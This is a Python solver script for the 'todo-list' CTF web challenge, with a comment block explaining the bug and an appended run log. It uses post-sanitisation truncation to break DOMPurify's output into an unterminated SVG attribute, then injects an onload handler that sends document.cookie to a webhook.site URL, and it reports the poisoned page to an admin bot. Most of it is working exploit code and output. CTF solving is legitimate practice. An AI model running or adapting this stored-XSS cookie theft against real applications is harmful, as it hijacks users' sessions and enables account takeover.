#!/usr/bin/env python3
"""
Solver for the "todo-list" AlpacaHack CTF.

The bug:
  web/index.js does
      const rawTitle = String(req.body.title || "").trim().slice(0, 255);
      const title    = DOMPurify.sanitize(rawTitle).slice(0, 255);
  Two issues compose:
    (a) `.slice(0,255)` AFTER sanitization can chop off the closing `">` of
        an attribute, leaving the parser with an unterminated quoted attribute.
    (b) DOMPurify's fast path returns input verbatim when it contains no `<`,
        so we can smuggle literal attribute-name="value" bytes through as text.

Smuggle:
  - top todo (rendered first):
        <svg viewbox=AAAA...AAAA></svg>   (241 A's; raw length 261)
    DOMPurify normalises to <svg viewBox="AAAA...AAAA"></svg> (257 chars),
    then `.slice(0,255)` chops to:
        <svg viewBox="AAAA...AAAA          (255 chars, unterminated quote)
  - bottom todo (rendered second/below, but stored first):
        " onload="fetch(WEBHOOK+'?c='+document.cookie)">     (no `<`, fast-path)

The browser sees the concatenation as one <svg> element with attributes:
        viewBox="AAA...AAA  </li> <li>  "     (all the template chrome eaten)
        onload="fetch(WEBHOOK+'?c='+document.cookie)"
  and `>` closes the tag, so the svg's onload fires.

Submission order matters: the app stores [newest, ...older], so the LATER
POST renders ABOVE the EARLIER POST. We want the opener on top → POST it last.

Usage:
    python3 solve.py http://web-host:port http://bot-host:port
    
    $ python solve.py http://localhost:3000 http://localhost:1337
    
    $ python solve.py http://34.170.146.252:20809 http://34.170.146.252:5475
"""
import sys
import re
import argparse
import urllib.parse
import http.client

WEBHOOK_URL = "https://webhook.site/a7bbfe01-76d2-4bce-a3d8-79c9594347c2"

# Payload pieces ------------------------------------------------------------

# Bottom todo (POSTed first → renders below).
# Plain text, no `<`, so DOMPurify's fast path returns it byte-for-byte.
# The leading `"` closes the truncated `viewBox="..."` from the opener.
PAYLOAD_BOTTOM = (
    '" onload="fetch(`' + WEBHOOK_URL + '/?c=`+document.cookie)">'
)

# Top todo (POSTed second → renders on top).
# 241 A's between `viewbox=` and `>` — raw is 261 chars, sliced to 255 before
# DOMPurify sees it. DOMPurify accepts the partial `<svg viewbox=AAA...A` and
# emits `<svg viewBox="AAA...A">` (with the closing `"` and `>` added — 257
# chars). The post-sanitize slice chops the trailing `">` away, leaving 255
# chars with the attribute value unterminated.
PAYLOAD_TOP = '<svg viewbox=' + ('A' * 241) + '>' # </svg>' 


print("len PAYLOAD_TOP:", len(PAYLOAD_TOP))
print("len PAYLOAD_BOTTOM:", len(PAYLOAD_BOTTOM))
print("PAYLOAD_TOP sliced:", PAYLOAD_TOP[:255])


def http_request(host, port, method, path, headers=None, body=None):
    conn = http.client.HTTPConnection(host, port, timeout=15)
    conn.request(method, path, body=body, headers=headers or {})
    resp = conn.getresponse()
    data = resp.read()
    set_cookie = resp.getheader("Set-Cookie") or ""
    status = resp.status
    conn.close()
    return status, set_cookie, data


def new_session(host, port):
    status, set_cookie, _ = http_request(host, port, "GET", "/")
    m = re.search(r"sessionId=([^;]+)", set_cookie)
    if not m:
        raise RuntimeError(f"no sessionId in Set-Cookie (status {status})")
    return m.group(1)


def add_todo(host, port, sid, title):
    body = urllib.parse.urlencode({"title": title})
    headers = {
        "Cookie": f"sessionId={sid}",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": str(len(body)),
    }
    status, _, _ = http_request(host, port, "POST", "/todos", headers, body)
    if status not in (200, 302):
        raise RuntimeError(f"add_todo got status {status}")


def report_to_bot(bot_host, bot_port, path):
    import json
    body = json.dumps({"path": path})
    headers = {"Content-Type": "application/json", "Content-Length": str(len(body))}
    status, _, data = http_request(bot_host, bot_port, "POST", "/api/report", headers, body)
    return status, data


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("web", help="web service base URL, e.g. http://localhost:3000")
    ap.add_argument("bot", help="bot service base URL, e.g. http://localhost:1337")
    ap.add_argument("--no-report", action="store_true",
                    help="just plant the todos, don't call the bot")
    args = ap.parse_args()

    web = urllib.parse.urlparse(args.web)
    bot = urllib.parse.urlparse(args.bot)
    web_host, web_port = web.hostname, web.port or 80
    bot_host, bot_port = bot.hostname, bot.port or 80

    print(f"[*] webhook: {WEBHOOK_URL}")
    print(f"[*] web:     {args.web}")
    print(f"[*] bot:     {args.bot}")
    print(f"[*] PAYLOAD_BOTTOM ({len(PAYLOAD_BOTTOM)} chars): {PAYLOAD_BOTTOM!r}")
    print(f"[*] PAYLOAD_TOP    ({len(PAYLOAD_TOP)} chars):    <svg viewbox=AAA...A></svg>")

    print("[*] bootstrapping session...")
    sid = new_session(web_host, web_port)
    print(f"[+] sessionId = {sid}")

    print("[*] posting bottom todo (the smuggle text)...")
    add_todo(web_host, web_port, sid, PAYLOAD_BOTTOM)

    print("[*] posting top todo (the truncation opener)...")
    add_todo(web_host, web_port, sid, PAYLOAD_TOP)

    path = f"?sessionId={urllib.parse.quote(sid)}"
    print(f"[+] readonly path: {path}")
    print(f"[+] readonly URL:  {args.web.rstrip('/')}/{path}")

    if args.no_report:
        print("[*] --no-report set, stopping here")
        return

    print("[*] reporting to bot...")
    status, data = report_to_bot(bot_host, bot_port, path)
    print(f"[+] bot response: {status} {data!r}")
    print(f"[*] check {WEBHOOK_URL} for the exfil request (look for ?c=FLAG=...)")


if __name__ == "__main__":
    main()

"""
$ python solve.py http://34.170.146.252:35039 http://34.170.146.252:27644
len PAYLOAD_TOP: 261
len PAYLOAD_BOTTOM: 98
PAYLOAD_TOP sliced: <svg viewbox=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>
[*] webhook: https://webhook.site/a7bbfe01-76d2-4bce-a3d8-79c9594347c2
[*] web:     http://34.170.146.252:35039
[*] bot:     http://34.170.146.252:27644
[*] PAYLOAD_BOTTOM (98 chars): '" onload="fetch(`https://webhook.site/a7bbfe01-76d2-4bce-a3d8-79c9594347c2/?c=`+document.cookie)">'
[*] PAYLOAD_TOP    (261 chars):    <svg viewbox=AAA...A></svg>
[*] bootstrapping session...
[+] sessionId = 134c49d2-4600-462b-a078-e20f5a524877
[*] posting bottom todo (the smuggle text)...
[*] posting top todo (the truncation opener)...
[+] readonly path: ?sessionId=134c49d2-4600-462b-a078-e20f5a524877
[+] readonly URL:  http://34.170.146.252:35039/?sessionId=134c49d2-4600-462b-a078-e20f5a524877
[*] reporting to bot...
[+] bot response: 200 b'OK'
[*] check https://webhook.site/a7bbfe01-76d2-4bce-a3d8-79c9594347c2 for the exfil request (look for ?c=FLAG=...)
"""